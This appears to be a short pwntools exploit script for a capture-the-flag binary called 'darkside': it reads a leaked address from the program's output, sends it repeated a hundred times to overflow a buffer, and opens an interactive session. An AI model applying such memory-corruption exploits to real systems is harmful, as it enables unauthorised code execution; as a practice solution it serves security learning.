from pwn import *

p = process('./darkside')

data = p.recvline()
leak = p64(int(data.split(b' ')[-1], 16))
p.sendline(leak*100)
p.interactive()
